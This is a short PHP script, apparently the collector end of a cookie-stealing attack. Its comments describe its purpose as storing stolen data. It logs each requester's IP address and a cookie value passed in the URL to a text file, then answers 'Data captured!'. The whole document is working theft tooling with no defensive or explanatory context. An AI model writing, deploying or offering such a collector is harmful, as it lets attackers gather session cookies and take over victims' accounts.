<?php
$file = 'log.txt';  // File to store stolen data
$data = "IP: " . $_SERVER['REMOTE_ADDR'] . " | Cookie: " . $_GET['cookie'] . "\n";

// Write to file
file_put_contents($file, $data, FILE_APPEND);

echo "Data captured!"; // Response (optional)
?>
